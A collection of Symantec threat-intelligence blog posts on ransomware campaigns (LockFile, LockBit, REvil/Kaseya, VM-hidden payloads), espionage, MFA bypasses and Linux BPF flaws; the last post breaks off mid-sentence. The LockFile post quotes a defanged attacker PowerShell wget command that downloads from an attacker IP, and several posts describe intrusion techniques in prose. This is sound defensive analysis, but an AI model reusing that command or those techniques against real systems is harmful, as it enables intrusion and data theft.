    "text": "UPDATE August 23: Third parties have identified a ProxyShell exploit as a potential vector for the PowerShell-related commands that are identified in this blog. Researcher Kevin Beaumontfirst spotted that ProxyShell was being exploited from 209.14.0[.]234 on August 13. The ProxyShell and LockFile link is also mentionedin this Twitter thread. Protection information has been updated below based on this new information. What appears to be a new ransomware family is being used to target victims in various industries around the globe. The LockFile ransomware was first observed on the network of a U. S. financial organization on July 20, 2021, with its latest activity seen as recently as August 20. LockFile has been seen on organizations around the world, with most of its victims based in the U. S. and Asia. Indications are that the attackers gain access to victims' networks via Microsoft Exchange Servers, and then usethe incompletely patched PetitPotam vulnerabilityto gain access to the domain controller, and then spread across the network. It is not clear how the attackers gain initial access to the Microsoft Exchange Servers. Victims are in the manufacturing, financial services, engineering, legal, business services, and travel and tourism sectors. The attackers behind this ransomware use a ransom note with a similar design to that used by the LockBit ransomware gang (Figure 1)and reference the Conti gang in the email address they use - contact@contipauper[.]com. Exchange servers are compromised through an as yet unidentified technique. On exploitation, the attacker executes a PowerShell command such as the following: powershell wget hxxp://209.14.0[.]234:46613/VcEtrKighyIFS5foGNXH Otherpowershell wgetcommands to the same IP address use similar seemingly random high port numbers. It is unknown exactly what is downloaded by the PowerShell command; however, the attackers maintain access on victim networks for at least several days before beginning the ransomware attack. Typically around 20 to 30 minutes prior to deploying ransomware, the attackers install a set of tools onto the compromised Exchange Server. Included in these tools is: The active_desktop_launcher.exe is a legitimate version of KuGou Active Desktop. The executable is being used in a DLL search order loading attack to load a malicious active_desktop_render.dll file. This active_desktop_render.dll file, when loaded by the active_desktop_launcher.exe, attempts to load and decrypt a file in the local directory called “desktop.ini”. If the file is successfully loaded and decrypted, shellcode from the file is executed. As the investigation into these attacks is ongoing, a copy of “desktop.ini” has yet to be retrieved for analysis. The encrypted shellcode, however, very likely activates the efspotato.exe file that exploits PetitPotam. This is an NTLM relay attack bug that can be used by a low-privileged attacker to take over a domain controller. It was patched inMicrosoft’s August Patch Tuesdayrelease, but it subsequently emerged that the fix released reportedly did not fully patch the vulnerability. Once access has been gained to the local domain controller, the attackers copy over the LockFile ransomware, along with a batch file and supporting executables, onto the domain controller. These files are copied into the “sysvol\\domain\\scripts” directory. This directory is used to deploy scripts to network clients when they authenticate to the domain controller. This means that any clients that authenticate to the domain after these files have been copied over will execute them. The files that are copied into the Sysvol directory are: The Autoupdate.exe file is a variant of the LockFile payload, which is unique to each organization targeted. The Autologin.exe, Autlogin.dll, and Autologin.sys files are all part of a toolkit called the Kernel Driver Utility (KDU -https://github.com/hfiref0x/KDU). Autologin.dll is the “Tanikaze.dll” component, and the autologin.exe is the “Hamakaze” component. It is currently unclear exactly how the KDU tool is utilized by the attacker in conjunction with the ransomware. Regardless of how they are utilized, the LockFile ransomware is ultimately executed. LockFile appears to be a new threat on the already crowded ransomware landscape. The investigation into this threat, and whether it may have links to any previously seen or retired ransomware threats continues. This is an ongoing investigation and Symantec, part ofBroadcom Software, may update this blog with new information if it comes to light.

    "text": "The shutdown of the Leafroller ransomware gang (aka Sodinokibi/REvil) has resulted in a surge in LockBit activity, as some ex-Sodinokibi affiliates move to that ransomware. Meanwhile, there is also more evidence that some attackers are affiliated to more than one ransomware group and are switching between ransomware families mid-attack if the initial ransomware they attempt to deploy fails to execute. These are just the latest developments Symantec, part ofBroadcom Software, has seen as ransomware actors continue to evolve their tactics to make their attacks more dangerous and effective. Attacks involving the LockBit ransomware have increased markedly over the past month, with some indications that the group behind it is attempting to fill the gap left by the Sodinokibi ransomware. Sodinokibi’sinfrastructure and websites disappeared on July 12, 2021, shortly after the group had carried out a major ransomware attack in which it encrypted approximately 60 managed service providers (MSPs) and more than 1,500 individual businesses usinga zero-day vulnerability in the Kaseya VSA remote management software. It’s unclear why exactly the gang’s operations shut down, but it has been speculated that the gang shuttered their activity following either pressure or action by law enforcement. Symantec researchers have seen evidence that at least one former Sodinokibi affiliate is now using LockBit. Symantec has observed an attacker using consistent tactics, tools, and procedures (TTPs) attempting to deliver Sodinokibi to victims until July of 2021, when the payload switched to LockBit. LockBit (aka Syrphid) was first seen in September 2019, and launched its ransomware-as-a-service (RaaS) offering in January 2020, however, there was a marked increase in its activity in the last month as it seemingly attempted to recruit former Sodinokibi affiliates. This recent attack began with a file named mimi.exe, which is an installer that drops a number of password-dumping tools. Immediately prior to the ransomware being launched, a large number of commands were executed to disable various services, block access to remote desktop protocol (RDP), and delete shadow copies. This is activity we typically see before ransomware is deployed on a system. The actor behind this attack consistently named their ransomware payload as svhost.exe and this practice was maintained following their transition to LockBit. The actors behind recent LockBit campaigns were seen using a variety of different TTPs before deploying the ransomware payload, including: The numerous password-dumping tools used by these attackers indicates that harvesting credentials is a key part of their attack chain. In another ransomware attack that occurred in June 2021, it appears that attackers who usually encrypt networks using the Conti ransomware switched payloads and used the Sodinokibi ransomware instead. Initial activity in this attack followed the attackers’ usual playbook, deploying Cobalt Strike, an off-the-shelf remote access tool commonly seen used in ransomware attacks. This would usually be followed by them delivering Conti. Conti first appeared in December 2019 and has been seen used in some high-profile recent ransomware attacks, many targeting healthcare providers, including a May 2021 ransomware attackthat crippled Ireland’s public health service provider, the HSE. However, in this recent attack, instead of deploying Conti, the attackers switched payloads and deployed Sodinokibi to encrypt several hundred machines on the network. Before Sodinokibi was deployed we saw the attackers use BitsAdmin when moving across the victim network, while they also carried out some other preliminary activity before deploying the ransomware, including disabling Microsoft Defender, disabling RealTime Monitoring, and deleting shadow copies. The attackers maintained a presence on the victim network for approximately three weeks before the Sodinokibi ransomware was deployed. While not common up to now, this isn’t the first time we have seen evidence of affiliates appearing to have access to more than one ransomware family at the same time. In the attack we talked about in our blogRansomware: Growing Number of Attackers Using Virtual Machines,there was evidence the attacker had access to both the Mount Locker and Conti ransomware, and may have attempted to run one payload on a virtual machine and, when that didn’t work, ran Mount Locker on the host computer instead. Affiliates switching between different ransomware families like this is yet another attempt by ransomware actors to increase the chances of their attacks succeeding, and it will be interesting to see whether or not this is a tactic we start to increasingly observe during ransomware attacks. Having access to multiple ransomware families increases the likelihood of affiliates being able to encrypt machines, increasing the dangers posed by these already dangerous attacks. This is just the latest development we have seen from ransomware actors, who are constantly refining their tactics in order to maximise their profits. The use of virtual machines was another example of attackers tweaking their approach in order to carry out a ransomware attack, while the emergence of double-extortion ransomware attacks last year, where attackers steal data and threaten to release it while also encrypting machines in ransomware attacks, led to one of the biggest shifts we saw in the ransomware landscape in recent times. The surge in LockBit activity that we have seen also shows that while some big ransomware names have shut down their operations in recent times, there are many other ransomware operators waiting to fill the space that has been left. Ransomware actors continue to change and refine their tactics in an effort to evade the security steps taken by organizations to stop these types of attacks, which is why ransomware remains one of the biggest threats on the cyber crime landscape in 2021.

    "text": "Four critical infrastructure organizations in a South East Asian country were targeted in an intelligence-gathering campaign that continued for several months. (Read the whitepaperhere.) Among the organizations targeted were a water company, a power company, a communications company, and a defense organization, with evidence the attackers were interested in information about SCADA systems. The attacks were ongoing from at least November 2020 to March 2021, several months before the Colonial Pipeline attack that drew the attention of the world to the danger posed by attacks on critical infrastructure, and may have begun even earlier than that. An attacker gaining access to multiple critical infrastructure organizations in the same country could potentially give malicious actors access to a vast amount of sensitive information. There are numerous indications that the same attacker was behind all the attacks, including: There are some indications that the attacker behind this campaign is based in China, but with the current information available, Symantec cannot attribute the activity to a known actor. Credential theft and lateral movement across victim networks seemed to be a key aim of the attacker, who made extensive use of living-off-the-land tools in this campaign. Among the living-off-the-land or dual-use tools used were: The attacker was also seen exploiting a legitimate multimedia player to load a malicious DLL via search order hijacking, as well as exploiting another legitimate tool to load suspicious files onto victim machines. We did not see what the initial infection vector used by the attacker to get onto targeted networks was, but we did have good insight into how they moved through infected networks. The first activity we saw in the attack on this organization was suspicious use of WMI. We then saw a legitimate free multimedia player called PotPlayer Mini being exploited to load a malicious DLL. Ithas previously been publicly documentedthat this player is susceptible to DLL search order hijacking, which is not a new technique but is one we see frequently leveraged by attackers to insert malicious files onto victim machines. We saw PotPlayer Mini added as a service to launch a file called potplayermini.exe, we then saw multiple dual-use and hacking tools launched, including: ProcDump was used for credential theft by abusing the LSASS.exe process, and domain shares were enumerated using net view. We then observed a suspected tunneling tool being launched on the system. We did not observe the attackers exfiltrating data from the infected machines. However, the machine the attackers were on did have tools on it that indicate it may have been involved in the design of SCADA systems, indicating this is something the attacker may have been interested in. PotPlayer Mini was also exploited on the power company network to carry out DLL search order hijacking, and ProcDump was deployed alongside another payload that we suspect was malware. We also saw the attacker once again carrying out credential theft by using ProcDump of the LSASS.exe process. There were indications that the infected machine in this company may also have been involved in engineering design. File overlap, as well as the similar tactics used, point to the same actor being behind the attacks on the water and power companies. Meanwhile, in the attack on the communications company the attacker exploited a different legitimate tool, Google Chrome Frame, with suspicious files appearing where chrome_frame_helper.exe was the parent file. Google Chrome Frame is a legitimate plugin for Internet Explorer that enables rendering of the full browser canvas using Google Chrome's rendering engine. It wasn’t clear if Google Chrome Frame was already present on the infected machine in this company or if it was introduced by the attacker, as it was the parent file of legitimate as well as suspicious files. PotPlayer Mini also appeared to be exploited on this machine by the attacker for malicious purposes. PAExec, a tool similar to PsExec, launched at.exe (a Windows task scheduler), in order to schedule execution of chrome_frame_helper.exe as a task. WMI was used to run chrome_frame_helper.exe and perform credential theft by dumping LSASS. PAExec and WMIC were also used for lateral movement and to launch chrome_frame_helper.exe against an internal IP address. PAExec also launched it to schedule execution of an unknown batch file as a daily task, and chrome_frame_helper.exe was also used to launch the SharpHound domain trust enumeration tool and other suspicious files. PAExec was also seen executing what appeared to be Mimikatz for suspected credential theft. WMI was also used to run chrome_frame_helper.exe to execute a net.exe command to connect a hidden C$ share. C$ shares are administrator shares that are not visible when viewing another computer's shares, but are accessible to those with administrator privileges on a machine. These types of shares are frequently used by malicious actors to stealthily transfer malware across a network and to collect stolen data. However, it is not clear what the C$ share was used for on this network. We also saw persistence created for chrome_frame_helper.exe as a scheduled task - GoogleUpdateTaskMachineCore4f23 - with the file disguised as chrome_proxy1.exe. A keylogger and several other files seen on the network of this organization were also seen on the network of the water company. In the defense organization we once again saw PotPlayer Mini exploited for DLL search order hijacking, as well as seeing some file overlaps between this organization and the communications and water companies. While we cannot definitively say what the end goal of the attacker was in these attacks, espionage seems like the likeliest motive. This is indicated by the activity we did see - credential stealing, lateral movement, keyloggers being deployed - and the types of machines targeted in some of the organizations - those involved in design and engineering. The ability of the attacker to maintain a stealthy presence on the targeted networks for a number of months indicates they were skilled. Certain artifacts found on the victim machines indicate the attacker may be based in China, though it is not possible with the information we have to definitively attribute these attacks to a named actor. A skilled malicious actor from a different country gaining a deep insight into a country’s critical infrastructure by compromising multiple critical infrastructure organizations, including a defense organization, could deliver a lot of valuable intelligence into the hands of adversaries. The Colonial Pipeline attack in the U. S. in May 2021 showed the serious repercussions attacks on critical infrastructure can have, and this campaign makes it clear that it is not just U. S. infrastructure that is under threat from malicious actors.

    "text": "UPDATE July 5 2021:Our blog has been updated with more details on how the ransomware was executed along with additional protection information. Several hundred organizations have been targeted by the REvil (aka Sodinokibi) ransomware in a supply chain attack involving Kaseya VSA software and multiple Managed Service Providers (MSPs) who use it. News of the attack broke yesterday (Friday 3 July), prompting Kaseya to urge VSAusers to shut down their VSA serversto prevent them from being compromised. The attack may have been timed to coincide with the 4th of July holiday weekend in the U. S., where many organizations may be lightly staffed. Are Symantec customers protected? Yes, Symantec Endpoint products proactively blocked tools used to deliver the ransomware payload in this wave of attacks. How many organizations are affected? According to Kaseya only a very small percentage of their customers were affected, “currently estimated at fewer than 40 worldwide”. However, each of those organizations may be MSPs with multiple customers. Current reports suggest hundreds of victims. How was REvil delivered to computers during these attacks? While the exploit used to breach Kaseya VSA server side has not yet been fully documented, it is known that the attackers delivered a malicious script and an ASCII PEM named agent.crt to Kaseya VSA clients. The dropper masqueraded inside the ASCII PEM file, which was decoded using certutil after attempts to disable Microsoft Defender. It dropped two resources, an old, but legitimate copy of Windows Defender (MsMpEng.exe) and custom malicious loader. The dropper writes the two files to disk and executes MsMpEng.exe which then side loads and executes the custom loader's export (mpsvc.dll). What was the motivation for the attacks? REvil attacks are usually financially motivated. However, there are some signs that the attacks may be politically motivated disruption. The attackers have, on occasion, appeared to have a political motive in their selection of targets. In this attack, strings in the payload made references to President Joe Biden, ex-president Donald Trump, and Black Lives Matter. The attackers demanded a ransom of $45,000, which may be another reference to Trump, who was the 45th president of the U. S. Furthermore, REvil’s Tor payment site is down at the time of writing, meaning victims will have no way of paying a ransom. Whether the group is having technical difficulties or whether it never intended to collect a ransom remains unclear. What is REvil/Sodinokibi? REvil (detected as Ransom. Sodinokibi) is a family of ransomware developed by a cybercrime group Symantec calls Leafroller. The ransomware is used in targeted attacks, where the attackers attempt to encrypt all computers on the victim’s network in the hope of extorting a large ransom. The group is known to steal victim data prior to encryption and threaten to release it unless a ransom is paid. Leafroller is one of the most established and prolific targeted ransomware groups in operation. Prior to its development of REvil, the group was associated with an older ransomware family known as Gandcrab. Leafroller is known to operate a Ransomware-as-a- Service, where its sells its tools to collaborators known as affiliates in exchange for a cut of any ransom payments they obtain. Tools associated with these attacks will be detected and blocked on machines running Symantec Endpoint products.

    "text": "Symantec has found evidence that an increasing number of ransomware attackers are using virtual machines (VMs) in order to run their ransomware payloads on compromised computers. The motivation behind the tactic is stealth. In order to avoid raising suspicions or triggering antivirus software, the ransomware payload will “hide” within a VM while encrypting files on the host computer. The tactic is a recent development,having been documented by Sophosin connection with RagnarLocker last year. In that case, ransomware was run from inside an Oracle VirtualBox Windows XP VM. During a recent investigation into an attempted ransomware attack, Symantec discovered that the attackers had installed a VirtualBox VM on some compromised computers. Unlike the previously documented RagnarLocker attacks, which involved Windows XP, the VM in this case appeared to be running Windows 7. The VM was delivered to the target via a malicious installer file that used various file names, including: The installer created a file called runner.exe, which was a Golang (Go) executable compiled from the following source file: Apart from standard Go libraries, it used thego-ps libraryfor process enumeration. Embedded strings used by the executable, such as file names, process names, and commands, were obfuscated using four-byte XOR keys. Each string was encrypted using a unique key. This executable depended on multiple other files that were expected to be present in the same directory. Its main purpose was to install a VirtualBox VM in a headless mode. When executed, runner.exe performed following actions: The executable then dropped, executed, and deleted a file called starter.bat with the following content in order to mount a recovery partition: It then decrypted and dropped VirtualBox.xml, a VirtualBox configuration file, and micro.xml, a VM configuration file (see appendix). It created an SDRSMLINK directory and linked system files to that directory, e.g: It also adjusted the \"<SharedFolders>\" section in micro.xml to reflect files and directories linked in CSIDL_WINDOWS\\SDRSMLINK. It then initialized VirtualBox components: It enumerated and cleared Windows system logs using WEvtUtil.exe: Symantec did not obtain a VM image, but what likely occurred next was that the ransomware payload was located on the VM's disk and auto started once the operating system was fully booted. The VM likely had access to the host computer’s files and directories (via \"SharedFolders\" set up by runner.exe), allowing it to encrypt files on the host computer. While the payload running in the VM was not identified, there were reasonably strong indicators that it was Conti. A username and password combination (nuuser/7HeC00l3stP@ssw0rd) used in these attacks was previously associated with older Conti activity, dating from April 2021. However, on the same computer that the VM was deployed on, Symantec also observed Mount Locker being deployed, raising the question as to whether the payload was actually Mount Locker. Since the main purpose of running a payload on a VM is to avoid detection, it doesn’t make much sense for the attacker to also deploy the payload on the host computer. One possible explanation is that the attacker is an affiliate operator with access to both Conti and Mount Locker. They may have attempted to run a payload (either Conti or Mount Locker) on a virtual machine and, when that didn’t work, opted to run Mount Locker on the host computer instead. Ransomware operators are continually refining their tactics in a bid to stay one step ahead of detection. Many are now heavily relying on legitimate and dual-use tools in order to stage attacks on targeted networks. The ransomware payload itself is often the stage of the attack most likely to raise red flags and, by hiding it in a virtual machine, there is an expectation that it may not be discovered. Organizations should exercise increased vigilance in relation to the unauthorized installation of virtual machines on their networks.

    "text": "When it comes to choosing their victims, ransomware attackers have become brutally adept at finding pain points. Their targets range from hospitals, schools, and local government to key infrastructure, such as water treatment and fuel pipelines – and they’re succeeding. Ransomware gangs have aggressively honed their tactics over time while ransomware creators franchise their tools to affiliates in exchange for a cut of the loot. Hardly a day goes by without news of another organization being hit by one of these groups. No longer just a criminal menace, the ransomware scourge now affects society as a whole, reaching a point where it has drawncomparisonsto the challenge the nation faced following the September 11, 2001, terrorist attacks. The time has come to change the dynamic that has developed around ransomware. While ransom payments may be sometimes unavoidable, ransom payment should be a measure of last resort, not the first response. Cyber insurance should be there to compensate victims, not reward attackers. Governments should recognize the key role they can play in assisting victims, both technically and financially. The Conti ransomware attack against Ireland’s national health service, the Health Service Executive (HSE), starkly illustrates the gravity of the threat we now face. In the middle of a global pandemic, attackers crippled its network, causing massive disruption to vital services and forcing it to cancel medical appointments. While the attackers subsequently released a decryption key, they are still attempting to hold the HSE to ransom by threatening to release sensitive patient records stolen during the attack. It would be a mistake to assume that the HSE was an unintentional victim of an indiscriminate campaign. We have no doubt that the attackers knew who they were infecting. It’s hardly a coincidence that the Irish government’s Department of Health was also targeted, albeit less successfully. Crippling the country’s health system appeared to be the end goal. And,as the FBI highlighted last month, attackers using Conti have previously targeted at least 16 healthcare and first responder organizations in the U. S. alone. Attacks such as these can require a high degree of interaction from malware operators, both to successfully deploy the ransomware across the victim’s network and, at the same time, to profile the victim to better estimate the amount of ransom they’re likely to pay based on the success of the attacker’s activity and the quality of the data available for exfiltration. The group behind the HSE attack proceeded with their attack because they knew the disruption it would cause at this key point in the Irish response to the COVID-19 pandemic could lead to a major payoff. Too often, the commentary following a major ransomware attack such as this focuses on the victim, asking whether they had done enough to secure their network. While there is an obvious duty on the part of the victim to make every effort to protect the IT systems and data on which it depends, to solely blame the victim for the attack is overly simplistic and distorts an understanding of the wider issue of why ransomware has become such a stunningly successful criminal enterprise. Aside from the fact that over-zealous public criticism of victims only encourages more victims to quietly capitulate and pay, it also draws attention away from the true perpetrators. The criminals behind targeted ransomware are now among the most technically proficient and well-resourced threat groups operating today. Blockchain analysis company Chainalysisestimated that ransomware gangs netted just under $350 million in 2020, a massive 311% increase over 2019. The scale of ransom payouts now means that the most successful groups will have a bigger operating budget than the victim’s network defenders in all but the largest of organizations. This allows them to operate both at a massive scale and also to persist in their attacks until they’re successful. The Irish government is to be commended for not bowing to pressure and paying a ransom. This is a stance that may be put under increasing pressure in the weeks and months ahead, particularly if the restoration of services proves slow or if sensitive medical data is leaked online. Nevertheless, it is the right decision. It is an unfortunate fact that there will be occasions when some victims will find themselves with no choice other than to pay the ransom. However, we are deeply concerned about how regularly the response to a ransomware attack has begun to resemble a professional transaction—a simple business cost. All too often, ransoms appear to be paid because the cost of the ransom is calculated as being lower than the short-term cost of restoring the victim’s IT systems from backups or because the ransom payment is covered by cyber insurance. These decisions are based on a short-term calculus, ignoring the long-term consequences of continuing to invest in an unhealthy ecosystem where ransomware attackers thrive and multiply. Over the long term, it’s going to do far more good for insurance payouts to go exclusively to the victims to reestablish their operations. This may cost more in the short term and raise costs for insurers and the premiums they charge, but taking a broader view, it’s the only way of cutting off ransomware criminals from the proceeds of their crimes and deterring future ransomware criminality. Governments have become alert to the role they need to play in tackling what is increasingly a societal problem. Much of the focus so far has been on the more obvious role government can play in providing IT security guidance and where necessary, defining security and reporting regulation for critical organizations. However, we suggest a more strategic way of tackling the ransomware threat specifically also needs to be considered. Many organizations, especially small businesses and local government, don’t have the technical resources to quickly recover their operations. To make it easier for ransomware victims to refuse to pay the extortion demands, government should also consider the role it can play in providing not only technical guidance but also supplying direct technical and financial support to these ransomware victims with the aim of getting them back on their feet as soon as possible. The threat of cyber criminals selling or publicizing stolen data is also forcing organizations into paying ransoms and this is increasingly as potent a tool in extorting a ransom as the outright crippling of IT systems, especially for public bodies that have a legal obligation regarding the protection of customer or user data. More can be done to reduce the impact of this type of crime. The Irish Health Service Executive’s response to its ransomware breach suggests a way forward. The HSE secured a legal injunction from the Irish High Court, restraining any sharing, processing, selling, or publishing of the stolen data. While a legal response rarely deters cyber criminals, it does have real value in reducing the likelihood of personal information being shared online or via social media, lessening the pressure on victims to pay extortion money to the ransomware criminals. We can’t pretend that fixing the toxic dynamic around ransomware is going to be easy. It is also clear that things are continuing to get worse and will only get better by combining effective detection and defense against ransomware with an increased focus on reducing the financial attraction of this activity to cyber criminals. As we saw with the addition of stolen data blackmail being added to ransoming IT systems, ransomware gangs have shown themselves adept at finding new techniques to pressure their victims and will certainly redouble their efforts if they encounter resistance. Whatever approach they take can only be defeated by further improving our ability make it harder for ransomware attacks to be successful, while at the same time equal effort needs to be made to reduce or remove entirely the money that feeds the criminals at the center of the ransomware ecosystem. We can put the odds back in our favor by making it harder for ransomware attackers to get away with it. That means more effective detection and defense. At the same time, equal effort needs to be made to reduce – or remove entirely – the money that feeds the criminals at the center of the global ransomware ecosystem.

    "text": "In recent years two-factor or multi-factor authentication (MFA) has been touted as the way to protect your personal and business accounts from attack. This led to the wide adoption of MFA - from corporate accounts to social media profiles, almost all provide the option of enabling MFA, with many requiring it. This means that, for attackers, stealing credentials or brute forcing passwords is no longer enough - if they don’t have access to victims’ multi-factor access token or code they will still not be able to access their accounts. The increasing use of MFA means that attackers have had to endeavor to find ways to bypass it, or avoid carrying out attacks that may be stalled by it. When we look at recent high-profile attacks, such as SolarWinds, the Microsoft Exchange Server ProxyLogon attacks, and the vulnerabilities found in Pulse Secure VPN recently, all these attacks help attackers avoid the hurdle of needing to overcome MFA. While MFA has perhaps only gained wide adoption in the last couple of years, attacks attempting to bypass MFAdate as far back as 2011, when RSA Security was forced to replace 40 million SecurID tokens - which were used for MFA at the time - after the company was hacked. However, recently, there have been some more notable examples of attacks that attempt to either bypass MFA, or eradicate the need to bypass it at all, with five of these outlined in this blog. On April 20, 2021, Pulse Secure published an advisory warning about a zero-day remote code execution vulnerability in its popular VPN product. On the same day,FireEye published a blogdetailing how the vulnerability (CVE-2021-22893) was being exploited by a China-linked APT group it tracks as UNC2630. FireEye said this group was attempting to leverage the vulnerability in attacks targeting defense industrial base (DIB) targets in the U. S. This new vulnerability was exploited, alongside a number of known Pulse Secure vulnerabilities, as the initial infection vector in these attacks. FireEye said that at least 12 malware families have been associated with exploit attempts against vulnerabilities in Pulse Secure. The malware was associated with what appears to be three threat actors, with attacks taking place in organizations in the U. S. and Europe. The UNC2630 activity that was analyzed by FireEye demonstrated that successfully exploiting this vulnerability in the VPN software allowed attackers to Trojanize shared objects with malicious code to log credentials and bypass authentication flows, including multi-factor authentication requirements. FireEye said it was tracking this activity as SlowPulse. The attackers were also able to maintain persistence, inject web shells, and modify files. VPNs became a very popular target for hackers over the last year, as increased working from home due to the pandemic meant that workers were increasingly using VPNs to log into their corporate networks. If an attacker is able to compromise the VPN software - through a vulnerability like this - it negates a need for them to acquire anything more in the line of multi-factor authentication. Apatch for this bug was issued on Monday(May 3), and all users of Pulse Secure should apply it quickly. Symantec has released Hacktool. Webshell and Hacktool. Atrium to block files believed to be related to this vulnerability. On March 2, Microsoft released emergency patches for four zero-day vulnerabilities in Microsoft Exchange Server that were being actively exploited by attackers in the wild. At the time, Microsoft said these vulnerabilities were being exploited by an APT group it dubbed Hafnium (Symantec tracks this group as Ant) in targeted attacks. However, it quickly became apparent that multiple threat actors had started exploiting these vulnerabilities, with numbers rising rapidly once the existence of the vulnerabilities became public knowledge. Two of the vulnerabilities (CVE-2021-26855andCVE-2021-27065) and the technique used to chain them together for exploitation were given the name“ProxyLogon”. Successful exploitation of these vulnerabilities allowed unauthenticated attackers to execute arbitrary code on vulnerable Exchange Servers, allowing them to gain persistent system access, access to files and mailboxes on the server, and access to credentials stored on the system. Successful exploitation may also allow attackers to compromise trust and identity in a vulnerable network. This gives attackers extensive access to infected networks, allowing them to steal potentially highly sensitive information from victim organizations, without the need to bypass any multi-factor authentication steps. In several instances the threat actors using these vulnerabilities were seen stealing emails from victim inboxes. To learn how Symantec helps protect you from these attacks, read our blog:How Symantec Stops Microsoft Exchange Server Attacks The SolarWinds attackswere uncovered in December 2020, and have rarely been out of the headlines since, with theU. S. recently announcingthat it would be imposing sanctions against Russia as a response to the SolarWinds breach, as well as a number of other cyber attacks. The statement from U. S. officials said they had “high confidence” that the SVR, the Russian Foreign Intelligence Service - also known as APT29, Cozy Bear, The Dukes - was responsible for the SolarWinds attack. The SolarWinds incident is believed to have started in around March 2020, with any user of SolarWinds Orion software who downloaded an update between March and December 2020 believed to have become infected with the first-stage malware, Backdoor. Sunburst. The initial infection of victims was indiscriminate, but only a small number of those who downloaded the initial compromised update saw additional malicious activity on their networks. The motivation of the SolarWinds attackers was always believed to be information stealing, with email appearing to be an area of particular interest to them. The attackers were also seen using various techniques to bypass MFA in the course of their attacks. In one incident, security firm Veloxity saidit saw the attackers using a novel technique to bypass 2FAprovided by Duo, though the same technique would likely bypass MFA from any provider that requires integration secrets stored in the potentially compromised environment. After gaining administrator privileges on an infected network, the hackers used those rights to steal a Duo secret known as an “akey” from a server running Outlook Web App (OWA), which enterprises use to provide account authentication for various network services. The hackers then used the “akey” to generate a cookie, so they’d have it ready when someone with the right username and password would need it when taking over an account. In another report,FireEye described the techniques it saw the attackers using. Among the techniques FireEye saw were: Attackers know they need a way to bypass or avoid MFA altogether if they want to access victims’ email accounts, which still appears to be the goal of many sophisticated attackers, including state-sponsored actors like those behind SolarWinds. Read all our SolarWinds research, and how Symantec helps protect you,on our dedicated blog page. In September 2020, Check Point published research on the Rampant Kitten hacking group, whichit said had developed a new Android malware that was capable of intercepting and stealing 2FA codes sent via text. It is known that text 2FA is significantly less secure than using an app or token - as tactics like SIM swapping (where a malicious actor gains access to your phone number) would allow codes to be intercepted - and many security experts think neither organizations nor individuals should be using this kind of 2FA if there is another option. Check Point said Rampant Kitten’s surveillance campaign had been ongoing for as long as six years, targeting dissidents and minorities in Iran. The malware was hidden inside an app that purported to be designed to help Iranian citizens get a Swedish driver's license. However, as well as harvesting contacts, old text messages, and recording using the microphone, the malicious app was also designed to look for SMS messages that contained a \"G-\" string, which is a prefix used by Google as part of the two-factor authentication process. The attackers would send phishing messages to victims in order to harvest their credentials, and would then also be able to access their 2FA codes and gain access to their accounts. The malware also forwarded all text messages to the attackers, meaning they could bypass 2FA for any other apps or services using text message 2FA too. Back in 2019,FOX-IT bloggedabout a Chinese state-sponsored group - APT20 - that wasbypassing 2FA in its attacks. FOX-IT had been monitoring the attacker’s activity over a period of two years, stating that it used living-off-the-land techniques to maintain a stealthy presence on victims’ networks in order to siphon off data for the purposes of espionage. FOX-IT found evidence the attackers had connected to VPN accounts that were protected by 2FA, with the researchers theorizing that they did this by stealing an RSA SecurID software token from a hacked system, which they then used to generate valid one-time codes and bypass 2FA at will. As FOX-IT explained at the time: “The software token is generated for a specific system, but of course this system specific value could easily be retrieved by the actor when having access to the system of the victim. “As it turns out, the actor does not actually need to go through the trouble of obtaining the victim's system specific value, because this specific value is only checked when importing the SecurID Token Seed, and has no relation to the seed used to generate actual two-factor tokens. This means the actor can actually simply patch the check which verifies if the imported soft token was generated for this system, and does not need to bother with stealing the system specific value at all. “In short, all the actor has to do to make use of the two-factor authentication codes is to steal an RSA SecurID Software Token and to patch one instruction, which results in the generation of valid tokens.” While it has been known for some time that some advanced persistent threat (APT) groups and sophisticated actors were able to bypass MFA in some instances, the recent sophisticated attacks that appear to have bypassing these kinds of protections as one of their main goals provides a reminder no single solution is sufficient. Fortunately, these attacks also show MFA is working as attackers need to go to great lengths to find alternative means to breach MFA-protected organizations. Organizations should take additional steps to increase protection, such as: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "text": "Two new vulnerabilities have been patched in the Linux kernel which, if exploited, could bypass existing mitigations for the Spectre vulnerabilities. The vulnerabilities were discovered by Piotr Krysiuk, a researcher on Symantec’s Threat Hunter team, who reported them to the Linux kernel security team. If left unpatched, the vulnerabilities mean that existing Spectre protections will not be sufficient to prevent some exploitation techniques. The vulnerabilities in question are: These bugs affect all Linux machines, but would be particularly impactful on shared resources, as it would allow one malicious user to access data belonging to other users. The patches for these bugs were first published on March 17, 2021, and are included with the Linux kernels released on March 20. Meltdown and Spectre were two chip vulnerabilities discovered in January 2018that affected nearly all modern processors and could only be mitigated through operating system patches. A successful exploit of the vulnerabilities could allow attackers to gain unauthorized access to a computer’s memory, including sensitive information, such as passwords. However, the vulnerabilities were only exploitable if the attacker already had access to the machines – if they were a local user or had gained access with an additional step, such as deploying a remote access Trojan (RAT) on the machine. Spectre exploited flaws in processor designs to reveal contents of memory that should not be normally accessible. It works by observing side effects left by speculative execution, such as when a processor incorrectly predicts results of bounds checks. Variants of Spectre affect virtually all modern processors, including chips from Intel, ARM, and AMD. Meltdown exploited different flaws in processors in order to bypass memory isolation in the operating system. Operating systems are designed in a way to block one application from accessing memory being used by another. If memory isolation fails to work, a malicious application could steal information from memory being used by other applications or users. Because they are chip vulnerabilities, any operating system patches were essentially mitigations designed to make it impossible for an attacker to exploit the vulnerabilities, rather than to address the underlying issue. It is mitigations for Spectre that can be bypassed in Linux using the vulnerabilities outlined in this blog. Both vulnerabilities are related to the Linux kernel support for \"extended Berkeley Packet Filters\" (BPF). BPF allows users to execute user-provided programs directly in the Linux kernel. When loading these programs, the Linux kernel analyzes the program code to ensure they are safe. However, part of this analysis, intended to mitigate Spectre, was not sufficient to protect against some exploitation techniques. Piotr was able to demonstrate two different methods to bypass this protection. These methods are independent as they abuse different issues, and each allows unprivileged local users to extract the contents of the kernel memory. This may include any secrets – passwords, clipboard contents, etc. - from other users on an affected system. The most serious issue is CVE-2020-27170, which can be abused to reveal content from any location within the kernel memory, all of the machine’s RAM, in other words. Unprivileged BPF programs running on affected systems could bypass the Spectre mitigations and execute speculatively out-of-bounds loads with no restrictions. This could then be abused to reveal contents of the memory via side-channels. The identified security gap was that unprivileged BPF programs were allowed to perform pointer arithmetic on particular pointer types, where the ptr_limit was not defined. The Linux kernel did not include 